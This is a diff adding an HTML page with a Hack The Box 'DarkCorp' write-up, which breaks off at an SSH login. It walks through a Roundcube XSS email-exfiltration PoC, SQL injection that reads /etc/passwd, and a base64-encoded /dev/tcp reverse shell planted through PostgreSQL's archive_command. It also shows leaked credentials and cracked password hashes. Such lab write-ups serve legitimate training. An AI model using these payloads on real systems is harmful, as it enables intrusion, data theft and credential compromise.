@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>DarkCorp | Paracausal Telemetry</title><meta name="description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SSH (22), HTTP (80), CVE-2024-42009." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-darkcorp/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="DarkCorp" /><meta property="og:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SSH (22), HTTP (80), CVE-2024-42009." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-darkcorp/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-darkcorp/og.png?v=f3cf708d" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="DarkCorp" /><meta name="twitter:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SSH (22), HTTP (80), CVE-2024-42009." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-darkcorp/og.png?v=f3cf708d" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"DarkCorp","description":"Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SSH (22), HTTP (80), CVE-2024-42009.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-darkcorp/","datePublished":"2026-09-04","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"DarkCorp","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-darkcorp/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">DarkCorp</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-09-04 · 33 min read</p><h1>DarkCorp</h1><p>Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SSH (22), HTTP (80), CVE-2024-42009.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · insane</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/DarkCorp" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-darkcorp.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-darkcorp.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>DarkCorp</h2><p>DarkCorp is an Insane-difficulty Windows machine with several computers joined. The initial foothold involves exploiting [CVE-2024-42009](https://nvd.nist.gov/vuln/detail/CVE-2024-42009), an XXS vulnerability and IDOR in RoundCube, via the Contact Page to read emails from a…</p></div><span class="room-badge room-badge-insane">Insane</span></div><dl class="room-facts"><div><dt>Released</dt><dd>8 Feb 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creators</dt><dd>0xEr3bus, ctrlzero</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>1,728</dd></div><div><dt>Root owns</dt><dd>1,711</dd></div><div><dt>User blood</dt><dd>kapiushion03<small class="room-blood-time">9H 35M 12S</small></dd></div><div><dt>Root blood</dt><dd>kapiushion03<small class="room-blood-time">11H 23M 13S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2073 votes from easiest to hardest"><rect x="0" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>47 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>5 votes</title></rect><rect x="52" y="62" width="20" height="2" rx="2" fill="hsl(80 70% 55%)"><title>22 votes</title></rect><rect x="78" y="59" width="20" height="5" rx="2" fill="hsl(70 70% 55%)"><title>80 votes</title></rect><rect x="104" y="61" width="20" height="3" rx="2" fill="hsl(50 70% 55%)"><title>48 votes</title></rect><rect x="130" y="60" width="20" height="4" rx="2" fill="hsl(38 70% 55%)"><title>63 votes</title></rect><rect x="156" y="55" width="20" height="9" rx="2" fill="hsl(28 70% 55%)"><title>157 votes</title></rect><rect x="182" y="52" width="20" height="12" rx="2" fill="hsl(16 70% 55%)"><title>199 votes</title></rect><rect x="208" y="44" width="20" height="20" rx="2" fill="hsl(8 70% 55%)"><title>350 votes</title></rect><rect x="234" y="0" width="20" height="64" rx="2" fill="hsl(0 70% 55%)"><title>1102 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.6, Real-Life 8.1, CVE 6.6, Custom Exploitation 3.4, CTF-Like 1.9"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,49.8 163.9,92.5 137.2,147.4 96.0,129.3 97.4,105.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/DarkCorp" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn 10.129.232.7
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:07 +0100
+Nmap scan report for 10.129.232.7
+Host is up (0.014s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 22,80 -A --min-rate=2000 -sT 10.129.232.7    
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:09 +0100
+Nmap scan report for 10.129.232.7
+Host is up (0.014s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
+|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: nginx/1.22.1
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2>SSH (22)</h2><h3>Auth method</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh root@10.129.232.7                                     
+The authenticity of host &#39;10.129.232.7 (10.129.232.7)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:JNw/rUlpDzlUEzvKKKFQ/M4prRH35ZhHammHWv47SkY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.129.232.7&#39; (ED25519) to the list of known hosts.
+root@10.129.232.7&#39;s password:</code></pre><p>Password based auth</p><h2>HTTP (80)</h2><p>The website points at the domain <code>drip.htb</code></p><p><img src="images/darkcorp/pasted-image-20260904171628.webp" alt="Screenshot" loading="lazy" /></p><p>The sign in link takes me to <code>mail.drip.htb</code></p><p><img src="images/darkcorp/pasted-image-20260904172715.webp" alt="Screenshot" loading="lazy" /></p><p><img src="images/darkcorp/pasted-image-20260904172910.webp" alt="Screenshot" loading="lazy" /></p><p>There is also a register function on the page</p><p>Just as i thought registering an accout allows me to logon to the dripmail instance</p><p><img src="images/darkcorp/pasted-image-20260904173332.webp" alt="Screenshot" loading="lazy" /></p><p>I am now logged in</p><p><img src="images/darkcorp/pasted-image-20260904173358.webp" alt="Screenshot" loading="lazy" /></p><p>Found the version info</p><p><img src="images/darkcorp/pasted-image-20260904173820.webp" alt="Screenshot" loading="lazy" /></p><p>Also found a potential user</p><p>This version of several different CVEs</p><h2>CVE-2024-42009</h2><p><a href="https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/" target="_blank" rel="noreferrer">https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/</a></p><p><a href="https://medium.com/@zaid.zrf/practical-exploitation-of-cve-2024-42009-using-docker-and-swaks-124ac0bad911" target="_blank" rel="noreferrer">https://medium.com/@zaid.zrf/practical-exploitation-of-cve-2024-42009-using-docker-and-swaks-124ac0bad911</a></p><p><a href="https://algora.io/claims/28piVn5uYiQzf8b4" target="_blank" rel="noreferrer">https://algora.io/claims/28piVn5uYiQzf8b4</a></p><p><a href="https://github.com/DaniTheHack3r/CVE-2024-42009-PoC?utm_source=chatgpt.com" target="_blank" rel="noreferrer">https://github.com/DaniTheHack3r/CVE-2024-42009-PoC?utm_source=chatgpt.com</a></p><p>I can use the contact form on the <code>http://drip.htb</code> page to send the email, interestingly if i proxy the request it lets me change the recipient, so ill create a victim account and begin trying the some payloads and testing them there</p><p><img src="images/darkcorp/pasted-image-20260904183549.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&lt;body title=&quot;bgcolor=foo&quot; name=&quot;bar style=animation-name:progress-bar-stripes onanimationstart=alert(1) foo=bar&quot;&gt;Foo&lt;/body&gt;</code></pre><p>Ive sent a simple alert payload, to the victim user and it mentions another user <code>bcase@drip.htb</code></p><p><a href="https://github.com/Bhanunamikaze/CVE-2024-42009/blob/main/exploit.py" target="_blank" rel="noreferrer">https://github.com/Bhanunamikaze/CVE-2024-42009/blob/main/exploit.py</a></p><p>Ill try this POC script</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 exploit.py -fu ethan@drip.htb -tu bcase@drip.htb -u http://drip.htb/contact -ip 10.10.14.61 -p 80
+[*] CVE-2024-42009 PoC: Listening on 10.10.14.61:80...
+
+
+[+] Captured Email Content:
+Hi bcase,
+Welcome to DripMail! We&#39;re excited to provide you with convenient email solutions! If you need help, please reach out to us at
+support@drip.htb
+.
+
+[+] Captured Email Content:
+Hey Bryce,
+The Analytics dashboard is now live. While it&#39;s still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
+You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you&#39;ll need to reset your password before logging in.
+If you encounter any issues or have feedback, let me know so I can address them promptly.
+Thanks
+
+[+] Captured Email Content:
+
+^C
+[!] Stopping...</code></pre><p>As seen here it allows me to exfil the users emails. It gives me info on another subdomain</p><h2><code>dev-a3f1-01</code> subdomain</h2><p><img src="images/darkcorp/pasted-image-20260904184544.webp" alt="Screenshot" loading="lazy" /></p><p>The leaked email tells me ill  have to reset my password before logging in!</p><p><img src="images/darkcorp/pasted-image-20260904184807.webp" alt="Screenshot" loading="lazy" /></p><p>Ill use the forgot password feature and send an email to bcase which i can then leak that email once again</p><p><img src="images/darkcorp/pasted-image-20260904185010.webp" alt="Screenshot" loading="lazy" /></p><p>Ive sent the reset request and using the POC i can dump the link</p><p>Using this link i can reset the password for <code>bcase</code>, ive changed the password to <code>password</code></p><p><code>bcase:password</code> gets me access to the dashboard</p><p><img src="images/darkcorp/pasted-image-20260904185431.webp" alt="Screenshot" loading="lazy" /></p><p>There is an analytics dashboard which i can use to see the other users</p><p><img src="images/darkcorp/pasted-image-20260904185545.webp" alt="Screenshot" loading="lazy" /></p><p>Using a <code>&#39;</code> in the search function on the analytics endpoint i get a SQL error, this is likely vulnerable to SQL injection</p><p>This error tells me its using postgresql as a backend database</p><h2>SQL injection on analytics subdomain</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs
+
+...[SNIP]...
+
+[19:08:49] [INFO] the back-end DBMS is PostgreSQL
+web application technology: Nginx 1.22.1, WordPress
+back-end DBMS: PostgreSQL
+[19:08:50] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
+[19:08:50] [INFO] fetching database (schema) names
+[19:08:50] [INFO] fetching number of databases
+[19:08:50] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
+[19:08:50] [INFO] retrieved: 3
+[19:08:51] [INFO] retrieved: 
+[19:08:51] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;
+[19:08:51] [INFO] retrieved: 
+[19:08:51] [INFO] retrieved: 
+[19:08:52] [INFO] falling back to current database
+[19:08:52] [INFO] fetching current database
+[19:08:52] [INFO] retrieved: public
+[19:08:55] [WARNING] on PostgreSQL you&#39;ll need to use schema names for enumeration as the counterpart to database names on other DBMSes
+available databases [1]:
+[*] public</code></pre><p>I have managed to the dump the database name, i can now dump its contents</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs --dbms=postgresql -D public --schema
+
+Database: public
+Table: Users
+[6 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| email       | varchar |
+| host_header | varchar |
+| id          | int4    |
+| ip_address  | varchar |
+| password    | varchar |
+| username    | varchar |
++-------------+---------+
+
+Database: public
+Table: Admins
+[4 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| email    | varchar |
+| id       | int4    |
+| password | varchar |
+| username | varchar |
++----------+---------+</code></pre><p>There are two tables in this DB</p><p>However i cannot dump the contents of either table</p><p><img src="images/darkcorp/pasted-image-20260907190228.webp" alt="Screenshot" loading="lazy" /></p><p>I am able to get SQLi to work through stacked queries</p><p><img src="images/darkcorp/pasted-image-20260907190724.webp" alt="Screenshot" loading="lazy" /></p><p>I can get the path of the config file, using this i should be able to get its output</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&#39;&#39;; SELECT pg_read_file(&#39;/etc/postgresql/15/main/postgresql.conf&#39;, 0, 2000);</code></pre><p><img src="images/darkcorp/pasted-image-20260907190933.webp" alt="Screenshot" loading="lazy" /></p><p>I can get the contents of the file, however this is only the first part of the file, i will continue reading through this</p><p>Using this same query i should be able to access other files on the system too</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&#39;&#39;; SELECT pg_read_file(&#39;/etc/passwd&#39;, 0, 2000);</code></pre><p><img src="images/darkcorp/pasted-image-20260907191041.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&#39;&#39;; SELECT pg_read_file(&#39;/etc/postgresql/15/main/postgresql.conf&#39;);</code></pre><p>Using this query i can read the full config file</p><p>Having a read through the full output i see <code>archive_mode</code> is enabled, which should allow RCE</p><p><img src="images/darkcorp/pasted-image-20260907191835.webp" alt="Screenshot" loading="lazy" /></p><p>As seen here it is on, if i can append a command to the <code>archive_command</code> parameter, it will execute it after the postgresql flushes its logs</p><h2>Reverse shell on linux server</h2><p><a href="https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3" target="_blank" rel="noreferrer">https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3</a></p><p>So ill follow this article to try and get RCE</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&#39;&#39;; SELECT pg_read_file(&#39;/etc/postgresql/15/main/postgresql.conf&#39;);</code></pre><p>Rather getting the LOID of the file then using that to output it, ill just use this copy the contents to my machine and modify the command parameter</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo &#39;bash -i &amp;&gt;/dev/tcp/10.10.14.61/1337 &lt;&amp;1&#39; | base64
+YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==</code></pre><p>Ill encode my command</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">archive_command = &#39;echo &quot;YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==&quot; | base64 -d | bash&#39;</code></pre><p>Then ill append it to the file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>Ill start a listener</p><p>Now the next step is to overwrite the current config with my malicious one</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat postgesql.conf | base64 -w 0 | xclip -selection clipboard</code></pre><p>Ill cat the malicious conf file then base64 encode its output and disable word wrap, then copy to clipboard</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SELECT lo_from_bytea(12345, decode(&#39;&lt;base64 contents&gt;&#39;, &#39;base64&#39;))</code></pre><p><img src="images/darkcorp/pasted-image-20260907195348.webp" alt="Screenshot" loading="lazy" /></p><p>This has loaded the new contents into the LOID 12345 and base64 decoded it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SELECT lo_export(12345, &#39;/etc/postgresql/15/main/postgresql.conf&#39;)</code></pre><p><img src="images/darkcorp/pasted-image-20260907195449.webp" alt="Screenshot" loading="lazy" /></p><p>Now the file should be exported</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&#39;&#39;; SELECT pg_read_file(&#39;/etc/postgresql/15/main/postgresql.conf&#39;);</code></pre><p><img src="images/darkcorp/pasted-image-20260907200202.webp" alt="Screenshot" loading="lazy" /></p><p>I can now re run my original command and see my config is there</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&#39;&#39;; SELECT pg_reload_conf()
+&#39;&#39;; SELECT pg_switch_wal()</code></pre><p><img src="images/darkcorp/pasted-image-20260907200555.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a shell on the system</p><h2>Privilege escalation</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">postgres@drip:/var/www/html/dashboard$ cat .env
+# True for development, False for production
+DEBUG=False
+
+# Flask ENV
+FLASK_APP=run.py
+FLASK_ENV=development
+
+# If not provided, a random one is generated 
+# SECRET_KEY=&lt;YOUR_SUPER_KEY_HERE&gt;
+
+# Used for CDN (in production)
+# No Slash at the end
+ASSETS_ROOT=/static/assets
+
+# If DB credentials (if NOT provided, or wrong values SQLite is used) 
+DB_ENGINE=postgresql
+DB_HOST=localhost
+DB_NAME=dripmail
+DB_USERNAME=dripmail_dba
+DB_PASS=2Qa2SsBkQvsc
+DB_PORT=5432
+
+SQLALCHEMY_DATABASE_URI = &#39;postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail&#39;
+SQLALCHEMY_TRACK_MODIFICATIONS = True
+SECRET_KEY = &#39;GCqtvsJtexx5B7xHNVxVj0y2X0m10jq&#39;
+MAIL_SERVER = &#39;drip.htb&#39;
+MAIL_PORT = 25
+MAIL_USE_TLS = False
+MAIL_USE_SSL = False
+MAIL_USERNAME = None
+MAIL_PASSWORD = None
+MAIL_DEFAULT_SENDER = &#39;support@drip.htb&#39;
+postgres@drip:/var/www/html/dashboard$ </code></pre><p>I have found a password, this is shown in a connection string for another DB user</p><p><img src="images/darkcorp/pasted-image-20260907203334.webp" alt="Screenshot" loading="lazy" /></p><p>Running linpeas i found some interesting GPG files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">postgres@drip:/var/backups/postgres$ gpg --decrypt dev-dripmail.old.sql.gpg | tee /tmp/dev-dripmail.old.sql
+
+...[SNIP]...
+
+COPY public.&quot;Admins&quot; (id, username, password, email) FROM stdin;
+1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb
+2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
+3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
+
+COPY public.&quot;Users&quot; (id, username, password, email, host_header, ip_address) FROM stdin;
+5001	support	d9b9ecbf29db8054b21f303072b37c4e	support@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
+5002	bcase	1eace53df87b9a15a37fdc11da2d298d	bcase@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
+5003	ebelford	0cebd84e066fd988e89083879e88c5f9	ebelford@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10</code></pre><p>Ill load these into hashcat</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">victor.r:cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
+ebelford:8bbd7f88841b4223ae63c8848969be86:ThePlague61780</code></pre><p>Two of the hashes cracked, however ebelford is the only user with a logon here</p><h2>Access as <code>ebelford</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh ebelford@drip.htb
